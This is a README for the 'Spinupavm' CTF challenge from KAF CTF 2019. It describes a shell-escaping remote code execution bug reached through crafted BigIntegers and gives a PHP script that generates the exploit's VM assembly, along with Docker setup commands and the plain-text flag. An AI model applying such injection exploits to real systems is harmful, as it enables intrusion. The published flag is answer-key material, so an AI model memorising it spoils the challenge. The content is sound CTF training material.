# Spinupavm

Spinupavm is an information security challenge in the Miscellaneous category, and was presented to participants of [KAF CTF 2019](https://ctf.kipodafterfree.com)

## Challenge story

No story

## Challenge exploit

Error reporting shell escaping exploit allows RCE through specifically crafted BinIntegers.

## Challenge solution

This code crafts special VM assembly code to create the BigInteger.
```php
<?php

$number = "13321722296716672858903025114813083973748";

// $number = "10";

$number = strrev($number);

$script = "psh sb\nmov rc ra\npsh sa\n";

for ($i = 0; $i<strlen($number); $i++){
	$num = intval($number[$i]);
	// get mult of 10
	$script.="pop sb\npsh sb\n";
	// multiply
	$script.="mov ra rc\n";
	for ($h=0; $h < $num-1; $h++) {
		$script.="mov rb rc\nadd\n";
	}
	// move, pop, add
	if ($num>0)
		$script.="mov ra rc\npop sa\nmov rb rc\nadd\npsh sa\n";

	$script.="pop sb\nmov ra rc\n";
	for ($h=0; $h < 9; $h++) {
		$script.="mov rb rc\nadd\n";
	}
	$script.="psh sb\n";
}
$script.="pop sa\n";
for ($a = 0; $a <= 20; $a++)
	$script.="psh sa\n";
$script.="prt rc\n";
echo $script;
?>
```

## Building and installing

[Clone](https://github.com/NadavTasher/2019-Spinupavm/archive/master.zip) the repository, then type the following command to build the container:
```bash
docker build . -t spinupavm
```

To run the challenge, execute the following command:
```bash
docker run --rm -d -p 1130:80 spinupavm
```

## Usage

You may now access the challenge interface through: `nc localhost 1130`

## Flag

Flag is:
```flagscript
KAF{w3ll_p1ay3d_my_hack3r_fr13nd}
```

## License
[MIT License](https://choosealicense.com/licenses/mit/)